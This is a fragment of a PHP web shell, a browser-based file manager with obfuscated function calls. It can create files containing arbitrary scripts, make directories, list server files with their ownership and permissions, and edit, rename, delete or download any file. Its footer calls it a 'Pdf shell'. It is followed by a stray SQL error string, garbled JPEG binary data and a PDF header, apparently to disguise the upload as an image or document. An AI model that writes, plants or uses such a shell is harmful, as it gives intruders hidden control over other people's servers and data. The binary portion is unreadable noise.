			<a class='btn btn-outline-light btn-sm' href='?dir=".hex($fungsi[7]())."&action=delete_folder'><i class='bi bi-trash-fill'></i></a>
		</div>
		<div class='card card-body text-dark input-group mb-3'>
			<p>Are you sure to delete : ".basename($dir)." ?</p>
			<form method='POST'>
				<a class='btn btn-danger btn-block btn-sm' href='?dir=".dirname($dir)."'>No</a>
				<input type='submit' name='yeah' class='btn btn-success btn-block btn-sm' value='Yes'>
			</form>
		</div>";
		}
		if(isset($_7['filenew'])) {
		s();
		if(isset($_7['bikin'])){
			$name = $_7['name_file'];
			$contents_file = $_7['contents_file'];
			foreach ($name as $name_file){
				$handle = @fopen("$name_file", "w");
				if($contents_file){
					$create = @fwrite($handle, $contents_file);
				} else {
					$create = $handle;
				}
			}
			if($create){
				echo "<script>window.location='?path=".hex($path)."'</script>";
			} else {
				echo '<strong>Create file</strong> fail! '.er().'</div>';
				}
			}
		echo "
		<div class='mb-3'>
			<form method='POST'>
				<i class='bi bi-file-earmark'></i> Filename:
				<input class='form-control form-control-sm' type='text' name='name_file[]' placeholder='filename' $_r>
				<i class='bi bi-file-earmark'></i> Your script:
				<textarea class='form-control form-control-sm' name='contents_file' rows='7' placeholder='your script' $_r></textarea>
				<div class='d-grid gap-2'>
					<input class='btn btn-outline-light btn-sm' type='submit' name='bikin' value='create'>
				</div>
			</form>
		</div>";
		}
		if(isset($_7['dirnew'])) {
		s();
		if(isset($_7['create'])){
			$name = $_7['name_dir'];
			foreach ($name as $name_dir){
				$folder = preg_replace("([^\w\s\d\-_~,;:\[\]\(\].]|[\.]{2,})", '', $name_dir);
				$fd = @mkdir ($folder);
			}
			if($fd){
				echo "<script>window.location='?path=".hex($path)."'</script>";
			} else {
				echo '<strong>Create dir</strong> fail! '.er().'</div>';
				}
			}
		echo "
		<div class='mb-3'>
			<form method='POST'>
				<i class='bi bi-folder'></i> Name directory:
				<div class='input-group mb-3'>
					<input class='form-control form-control-sm' type='text' name='name_dir[]' placeholder='Dir name' $_r>
					<input class='btn btn-outline-light btn-sm' type='submit' name='create' value='create dir'>
				</div>
			</form>
		</div>";
		}
		echo '
		<div class="table-responsive">
		<table class="table table-hover table-dark text-light">
		<thead>
		<tr>
			<td class="text-center">name</td><td class="text-center">type</td>
				<td class="text-center">last edit</td>
				<td class="text-center">size</td>
				<td class="text-center">owner<gr>/</gr>group</td>
				<td class="text-center">permsion</td>
			<td class="text-center">action</td>
		</tr>
		</thead>
		<tbody class="text-nowrap">
		<tr>
			<td><i class="bi bi-folder2-open"></i><a class="text-decoration-none text-secondary" href="?path='.dirname($dir).'">..</a></td><td></td><td></td><td></td><td></td><td></td><td class="text-center">
				<div class="btn-group">
					<a class="btn btn-outline-light btn-sm" href="?filenew&path='.$dir.'"><i class="bi bi-file-earmark-plus-fill"></i></a>
					<a class="btn btn-outline-light btn-sm" href="?dirnew&path='.$dir.'"><i class="bi bi-folder-plus"></i></a>
				</div>
			</td>
		</tr>';		
		foreach($scand as $dir){
			$dt = date("Y-m-d G:i", filemtime("$path/$dir"));
			if(strlen($dir) > 25) {
				$_d = substr($dir, 0, 25)."...";		
			}else{
				$_d = $dir;
			}
			if($GLOBALS['fungsi'][5]('posix_getpwuid')) {
				$downer = @posix_getpwuid(fileowner("$path/$dir"));
				$downer = $downer['name'];
			} else {
				$downer = fileowner("$path/$dir");
			}
			if($GLOBALS['fungsi'][5]('posix_getgrgid')) {
				$dgrp = @posix_getgrgid(filegroup("$path/$dir"));
				$dgrp = $dgrp['name'];
			} else {
				$dgrp = filegroup("$path/$dir");
			}
			if(!$fungsi[1]($path.'/'.$file)) continue;
				$size = filesize($path.'/'.$file)/1024;
				$size = round($size,3);
			if($size >= 1024){
				$size = round($size/1024,2).' MB';
			}else{
				$size = $size.' KB';
			}
		if(!$fungsi[1]($path.'/'.$dir) || $dir == '.' || $dir == '..') continue;
		echo "
		<tr>
			<td><i class='bi bi-folder-fill'></i><a class='text-decoration-none text-secondary' href='?dir=".hex($path.'/'.$dir)."'>$_d</a></td>
			<td class='text-center'>dir</td>
			<td class='text-center'>$dt</td>
			<td class='text-center'>-</td>
			<td class='text-center'>$downer<gr>/</gr>$dgrp</td>
			<td class='text-center'>";
				if(is_writable($path.'/'.$dir)) echo '<gr>';
					elseif(!is_readable($path.'/'.$dir)) echo '<rd>';
				echo p($path.'/'.$dir);
				if(is_writable($path.'/'.$dir) || !is_readable($path.'/'.$dir)) echo '</font></center></td>';
		echo "
			<td class='text-center'>
			<div class='btn-group'>
				<a class='btn btn-outline-light btn-sm' href='?dir=".hex($path.'/'.$dir)."&action=rename_folder'><i class='bi bi-pencil-fill'></i></a><a class='btn btn-outline-light btn-sm' href='?dir=".hex($path.'/'.$dir)."&action=delete_folder'><i class='bi bi-trash-fill'></i></a>
			</div>
			</td>
		</tr>";
		}
		foreach($scand as $file){
			$ft = date("Y-m-d G:i", filemtime("$path/$file"));
			if($GLOBALS['fungsi'][5]('posix_getpwuid')) {
				$fowner = @posix_getpwuid(fileowner("$path/$file"));
				$fowner = $fowner['name'];
			} else {
				$fowner = fileowner("$path/$file");
			}
			if($GLOBALS['fungsi'][5]('posix_getgrgid')) {
				$fgrp = @posix_getgrgid(filegroup("$path/$file"));
				$fgrp = $fgrp['name'];
			} else {
				$fgrp = filegroup("$path/$file");
			}
			if(!$fungsi[3]($path.'/'.$file)) continue;
			if(strlen($file) > 25) {
				$_f = substr($file, 0, 25)."...-.".$ext;		
			}else{
				$_f = $file;
			}
		echo "
		<tr>
		<td><i class='bi bi-file-earmark-text-fill'></i><a class='text-decoration-none text-secondary' href='?dir=".hex($fungsi[7]())."&action=view&opn=$file'>$_f</a></td>
			<td class='text-center'>file</td>
			<td class='text-center'>$ft</td>
			<td class='text-center'>".sz(filesize($file))."</td>
			<td class='text-center'>$fowner<gr>/</gr>$fgrp</td>
			<td class='text-center'>";if(is_writable($path.'/'.$file)) echo '<gr>';
			elseif(!is_readable($path.'/'.$file)) echo '<rd>';
				echo p($path.'/'.$file);
			if(is_writable($path.'/'.$file) || !is_readable($path.'/'.$file)) echo '</gr></rd></td>';
			echo "
			<td class='text-center'>
			<div class='btn-group'>
				<a class='btn btn-outline-light btn-sm' href='?dir=".hex($fungsi[7]())."&action=view&opn=$path/$file'><i class='bi bi-eye-fill'></i></a>
				<a class='btn btn-outline-light btn-sm' href='?dir=".hex($fungsi[7]())."&action=edit&opn=$path/$file'><i class='bi bi-pencil-square'></i></a>
				<a class='btn btn-outline-light btn-sm' href='?dir=".hex($fungsi[7]())."&action=rename&opn=$path/$file'><i class='bi bi-pencil-fill'></i></a>
				<a class='btn btn-outline-light btn-sm' href='?dir=".hex($fungsi[7]())."&action=delete_file&opn=$path/$file'><i class='bi bi-trash-fill'></i></a>
				<a class='btn btn-outline-light btn-sm' href='?dir=".hex($fungsi[7]())."&action=download&opn=$path/$file'><i class='bi bi-download'></i></a>
			</div>
			</td>
		</tr>";
		}
		?>
		</tbody>
		</table>
		</div><div class='text-secondary'>&copyleft; Pdf shell to php xfellpramudika-<?=date('Y');?> Powered by Liteespeed server</div>
	</div>
</div>
</body>
</html>
"text":"select * from user_profile where profile_id=''","tanda":"2","pesan":"Tidak ditemukan.."}ÿØÿà JFIF    ÿâ(ICC_PROFILE    mntrRGB XYZ acsp  öÖ  Ó- desc ð trXYZ d gXYZ x bXYZ Œ rTRC   (gTRC   (bTRC   (wtpt È cprt Ü b}aùë¹ŸQåç›K–šét9œöwåå‚ŽÑêŸ75 K5SÞI)ƒNŽlðíG³à¯m­[>|Êþ“ç~ˆ>&þ~€t~Wê¾P¤Ÿ5%çÞ˜}œX®›ÉýgÊn}WŸè9à¯o4ø]ÚÌYtUÄÎ‰š0•2óv¢q[×'©~ƒ}—Üpî—oÄváÄhgh³£òYò¤ýDEU@àvò5ñ×¨òÏRòÝrõ, ü1Â|.)DQL©lÀt²ª4ac\Íf¨|ýê¾Ë‡î8p]¿ÚŠÑ·m—¼³Ò|Ý?NÈÖÇ5èÞmèìà´é™w–ú¯&Î§Ÿè¹0¶A65(Žt5Kk1$óÎ•gri4ùÉ;ì¸t™ròHÞdƒ’ÅH}ö:AÌz:AÅÑH;ò¤Ô<ý Ü‚YCŠJ—ÿÄ +   !13425A"#0%ÿÚ  ÀÖØë]l{?ò¬Áƒklu1Áœ¯¡ƒÙÿ Š+Ù,‘¯£•Z(tŽ¶r³¾Ëv1l™9„úk!"0å=F±²éÁÊ8Y4¢gv1¥HÈžÕ‘©EXŒˆ¢c|o¯µ!¶úXÆ>œ‘be&ÄhÁŽœm¨³ ÷èåg#(±¦1ìú(0`’F‡¾S¯–3—4¶K%tŠ´r£•‚%TIé‘fšD¡(õQ»$3[-õòþ"![‘]I0`ÀÐÐÐâN´Ët¤é”Fžô½Ùcî„†Ž\Š#ìeéfÄSSd"’éÁÄhhh”IÑOLN§¢C‘93!Y9LzàÔÁóÑIoÌ2›J/l G)Çh”Q$B&S”Á$Y÷ŠbBBÙ¡ÓZx±éGM‘#uuX¦†4444X‡æÆ5Þ(Q1³$[òÙ[àÆÍ‚d ¢÷hki‘¥{At2okž,B"-ÓÙïòYg)õPo)‘ŽeÊ3:dÇÝ¿Kc™!|§q±nÞÍŽMF™5¤”•”WÚqÜÇ9ÌdÉ6@kµ±Ú"CÙ}fŸM›£Å³CFÜË9Îr¯BÈæ2í(ìŸL™Ìs¯Nbr+‹“¦8E04N&;×è?MD{¦&dÉ“;KÕ`”H}ÃD¢F<Îšð£µ»9#'?}¤†»ÇfûZXˆ=šgt)lÑ(÷þD#Üd=}’ÞÒÉ`lË$U,­¦9³$§É¢sL‰³C‰ü¢yÇ˜˜¤&dr*4 °–öšŒó!Ñ7•kB±2m‘Ï#ù7r¹\lFpBkg´’b‚c˜Ë"²Q%Ñi(ä•I’¥Ž¹‹±úåîÖ z¨‰¼SžTë«š<ÇÏGœ™Îsl„Š+MÝ ×‘å™d„Œ0&ÑÎÎvK,pÉ*&i÷[!@‚ê»¥’ŽIÕƒ÷°`Áƒ”å0F´ÇR/§$—+‹Ex &'ÓwSôVk5}'—ˆŸMÄO?Zµ~O5ë4Öiž»R¥OIk/ò!W”U|Dÿ ¥:ÙÂZŠã:ôôê¯#¤×ÄúÍDH×ÄZ¾zí9T³^L’‘¨¿ùt3Sw*àwB6Wd'´îª"’—ˆ{žø¶û­7±}°¦}MWšš!u|=µöOíŸÎ«Ûãÿ ‹ÿ ¯êç¢Ë\‰.Mª+¼ŸÑC>íie*þ#^žqSÄ~ï‡¾-¾Û4þÏø ¸ëR¿Ëâæ¹ý³ù•{~ ø´×ý~P«I.‹ìPŒ›œ¢Œvà_$«ò–þXñ'¹áï‹o¶þí?³¬¢:Št<>­+â:µ¦«M_™{Rûeòªöø÷Æ¥V7–öO•]c²QB?\ä¿J)oå{žø–ûfŸÙ×j>š†©ßL-‡}5þö§öÏåUíñïO·»{6k-Ë‰®òYOå.ü±âOsÃ¿Ïoõ§öx÷Àáo@âëþ‡}©ý³ùU{|{ãÓí66d“56rÃÕÅ[~¸É)ü§þ½UrR‡Ðýdxv›éhÖØªÓ¸µNŸÙãß†|ÿ ×Yâ|^^¡’áYÖEaq»§ÑlÈÙ‘š“÷;?NòTþS‰ü~ßÓmÇ›òõMìñÿ Ã~ëˆ~VÞÜFi?Iwâ›2[ÿÄ !   0!"1PÿÚ ?¯äQÔêV—èŒ,P:GÆ>!ñ²¶JÇÆGŒQÍá#©.4tÖ'î”uËîÐ~†Jc–ÐÒŠ(¢n‰Ë5¢d‰mË,¡!Ä‰œbÅw'ÈIÞlRŽFX…:<¢æg”ò³³ì¢´²Ë/fý•‹Ãø‹-ýw“ÂÑzŸ¿ÿÄ    0@1ÿÚ ?¿ÁeâË/ð¢‹66òX”ès,ØSbúŠ}²2%ôÍa±HÑ›•ÃæÍ†ò„ú}]0ÈÓ™õ-ÕÍr>¶}m°}[¾mMMzO´Ôð³ÅÑ}¶¥» uoØÞ:ží÷þóöß®×.kò.¦½šåË›\d±ËúXiØ.Ï#>šísé.yÆ–‰š£T|Hý=üF¨Š©æ9A«º%‰; I£Ty3‡Úi¸ýN8’÷o$Ï‰5ì^èR›V¸›éX«Ç$³<2O9¢ñwXRä¶'êØãžHÿ ®5$U¡/”©÷þâ?’8åÍo31Ë2¬o{aR2nÅ>)r[õìHJ/&°¬MýFqÈº•·Â©K CÜ–ÄýB;œ´eã¨ß™*ÒÖD÷ù-Èóß–¶øU)aH{’ØŸ¨GaÔµÎYŽ3W'ìïO"{Œü‚âçá\µ÷Â©K CÜ–ÄýB;)ý¸-‰î3ò[‘ç¿-}ðªQ­ä˜šš8 Iÿ £üÒ#±"ŸÛ„WÐ©FX{Þ/ îX§Ekq.¥}ðª1gŠÌ§¹‰¾Ü!±d,e~oÿÄ "   !1A¡ Qaq±‘ÿÚ  ?!º,ppGÂ^,ñr!ú“Â9Ùæ# ›0¼%É ¼øYýHØbbÅüX±5}‰;—à„5 $paËªÌ/Ï‹1Î8bÛ²Ylpa†è¿;Ä82ä°K'È $’Ë›™åt/¥Åù_”¯£OP2íw‹‡’Z˜±[nFÚÅ‹¥´ÇQ¿±QÀü@ƒâËZ‚ñÆx %Õvž,¦;ðíX—¤h‚Å‹€]p½œSºwE¬ÐÌç5aÜ…¬ëxç"õÄ„,Z$ûI.Íøî°XùõñŠj–cˆEçoÄrôA­ÙÁã€X…îEö‘øSyK YAÜÃã¢k¥½—ãÆ[6E§0µÉˆ.ÊhÂr Õ‰œwu»XÝ„áø_¥× „–1ð,O=˜Ê´Ø¹EÕ¨]xGRË-«€1Â‚ÄÇIRË0XÇr@6Làã%ƒ4°c‚à€X[_Ü‹Ã¶|,'QßÀãŠ5+Ç`’3ñ•„¦xžJÉ±K'&òr8ËPð ›2êÅ4Ö2î1“‹é€BF,ZÆfcFÑ×Áæì,ÑË"ð4Ãqùq>ÂC Å¾åŽ,4læÅ’Àe£à–ˆ€­f„b“e}3!“ÇNfâb²Ænõ³0ó.¬MÂ;’êjX….ào¦pgÅ‡“ˆÀÈV‡=âè–·a0€Îvß3XÝO‰Åå+s™ ýÃQ’G˜sg/Ýã.å„ËÅšuO0±ÏxŽ £Ù,D¾–3?.Ñ¾äŸy6ÓgïM›g0³7‘ŽAðïÉ²]£¸kbÀõfb“+ªÏ*>¤í°¨â[ÎÀ|Ä’cdC$Ž‘€aÆÂÂ à,¡ cŒóo‘Ì1¾ÕLða^jŠ)B]¥‰?J""¬PI˜w¸Â^Æu.ƒBÛ,Ë>©Yí´äÎm ß %Ž¡Þ$ô+ÓÏ  ¿Ø°2xãýW¿‡ýÓüR…Á‘…ÔŠglCúÿ „w¾ŒðŒŸ«Tb´]%qž^1³§Ê\/Ô\ø/3Ó0ý…óß|§öØž»‚ó7f¨g#fÍeÞ”7o£lg‡ñˆHuËw­ÙCðÊz~£Œö‡®´¥%Ÿ¼Ü jO·Á_R;ÏFõ—ü‹¥–R:¼ÑžÜg'_ìæ;O]¸~80„¶gU‹?×zdôoQzü-ž,Ø$Êp<^ÜOGžŽ¯ör˜Ã×^ÁhÌñ6sÍö·¡vOFô¶¿Ãà œLwunµA=¸—§†¤2Y ´F9åžÜ@?czëÞ%ÂÃe…r@FäKô™¬’_ÌàxÅ=8ìþq,ôà9‰Y“¯¾<Ø†XÏYˆc1§ íc^òü·ÉÊœ¦qÖgâÿÚ    –øúÚ,‹–v(à!ü–Dn¬ŠÀïY« øŽ€aG€¤²H`áÝÂ<ˆ²9m‡TüZCƒ™!>ÊVª  „ÔÈ&Ï@{Hö‹:i$Ð½±©ˆ1µ ´”#MEÒSü¦‰†•)€80¡pl±ŒT*8}CD»H 0BšH0P…<—‰Éò°*¼Šè$Œ1JÛ‡ öÔŽ ¨ðO,à]€¬R°3Â~r \pãú7£õ÷ ÿÄ   ! 1AÿÚ ?©qæü—äI2YòÛoÆÃg¥„Â·(èôžü¾É_È–Ž¶E»/ %PDF-
